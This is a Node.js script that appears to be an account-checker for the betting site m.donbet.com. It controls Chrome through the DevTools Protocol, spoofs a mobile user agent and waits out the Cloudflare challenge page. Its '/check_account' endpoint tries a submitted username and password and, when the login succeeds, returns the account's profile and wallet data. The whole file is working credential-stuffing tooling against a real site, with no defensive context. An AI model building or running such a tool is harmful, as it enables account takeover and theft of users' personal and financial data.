const http = require('http');
const url = require('url');
const WebSocket = require('ws');
const fetch = global.fetch;

let wsConn = null, msgId = 0;
const pending = new Map();

async function connectBrowser() {
    if (wsConn && wsConn.readyState === WebSocket.OPEN) return wsConn;
    const r = await fetch('http://127.0.0.1:9222/json/version');
    const data = await r.json();
    wsConn = new WebSocket(data.webSocketDebuggerUrl, { perMessageDeflate: false, maxPayload: 100 * 1024 * 1024 });
    await new Promise((resolve, reject) => { wsConn.once('open', resolve); wsConn.once('error', reject); });
    wsConn.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg.id && pending.has(msg.id)) {
                const { resolve, reject } = pending.get(msg.id);
                pending.delete(msg.id);
                if (msg.error) reject(new Error(JSON.stringify(msg.error)));
                else resolve(msg.result);
            }
        } catch (e) {}
    });
    wsConn.on('close', () => { wsConn = null; });
    wsConn.on('error', () => {});
    return wsConn;
}

function cdpSend(method, params = {}, sessionId = undefined) {
    return new Promise((resolve, reject) => {
        if (!wsConn || wsConn.readyState !== WebSocket.OPEN) return reject(new Error('CDP not connected'));
        const id = ++msgId;
        const msg = { id, method, params };
        if (sessionId) msg.sessionId = sessionId;
        pending.set(id, { resolve, reject });
        wsConn.send(JSON.stringify(msg));
        setTimeout(() => { if (pending.has(id)) { pending.delete(id); reject(new Error('CDP timeout')); } }, 40000);
    });
}

async function createTargetAndSession(targetUrl) {
    const { targetId } = await cdpSend('Target.createTarget', { url: 'about:blank' });
    const { sessionId } = await cdpSend('Target.attachToTarget', { targetId, flatten: true });
    await cdpSend('Page.enable', {}, sessionId);
    await cdpSend('Runtime.enable', {}, sessionId);
    await cdpSend('Network.enable', {}, sessionId);
    await cdpSend('Emulation.setUserAgentOverride', {
        userAgent: 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        acceptLanguage: 'en-US,en;q=0.9', platform: 'Android'
    }, sessionId);
    await cdpSend('Page.navigate', { url: targetUrl }, sessionId);
    return { targetId, sessionId };
}

async function waitForReady(sessionId, maxWaitMs = 15000) {
    const start = Date.now();
    while (Date.now() - start < maxWaitMs) {
        try {
            const { result } = await cdpSend('Runtime.evaluate', { expression: 'document.title', returnByValue: true }, sessionId);
            const title = (result && result.value) || '';
            if (!title.toLowerCase().includes('just a moment') && title.length > 0) return true;
        } catch (e) {}
        await new Promise(r => setTimeout(r, 1000));
    }
    return false;
}

const server = http.createServer(async (req, res) => {
    const parsed = url.parse(req.url, true);
    const path = parsed.pathname;
    const sendJSON = (code, data) => {
        res.writeHead(code, { 'Content-Type': 'application/json; charset=utf-8' });
        res.end(JSON.stringify(data));
    };

    if (path === '/health') return sendJSON(200, { status: 'ok' });

    if (path === '/check_account') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { username, password } = JSON.parse(body);
                await connectBrowser();
                const { targetId, sessionId } = await createTargetAndSession('https://m.donbet.com/en?modal=login');
                
                await waitForReady(sessionId);
                await new Promise(r => setTimeout(r, 1000));

                // Script to do login, profile, and wallet all in one go inside the same page
                const fullScript = `(async () => {
                    try {
                        // 1. Login
                        const loginRes = await fetch('https://m.donbet.com/api/profile/login', {
                            method: 'POST', headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ UserName: ${JSON.stringify(username)}, Password: ${JSON.stringify(password)}, pin: null }),
                            credentials: 'include'
                        });
                        const loginText = await loginRes.text();
                        const loginData = JSON.parse(loginText);
                        
                        if (loginData.status !== 1) return JSON.stringify({ valid: false, reason: 'bad_credentials' });

                        // 2. Profile
                        const profRes = await fetch('https://m.donbet.com/api/profile/p/getProfile', {
                            method: 'GET', headers: { 'Content-Type': 'application/json' }, credentials: 'include'
                        });
                        const profile = await profRes.text();

                        // 3. Wallet
                        const walRes = await fetch('https://m.donbet.com/api/profile/p/getWallets', {
                            method: 'GET', headers: { 'Content-Type': 'application/json' }, credentials: 'include'
                        });
                        const wallet = await walRes.text();

                        return JSON.stringify({ valid: true, profile: profile, wallet: wallet });
                    } catch (e) {
                        return JSON.stringify({ valid: false, reason: e.message });
                    }
                })()`;

                const { result } = await cdpSend('Runtime.evaluate', { expression: fullScript, returnByValue: true, awaitPromise: true }, sessionId);
                const data = JSON.parse(result.value);
                
                await cdpSend('Target.closeTarget', { targetId });
                sendJSON(200, data);
            } catch (e) { sendJSON(500, { error: e.message }); }
        });
        return;
    }
    sendJSON(404, { error: 'not found' });
});

(async () => {
    await connectBrowser();
    server.listen(8000, '127.0.0.1', () => console.log('✅ Solver listening on http://127.0.0.1:8000'));
})();
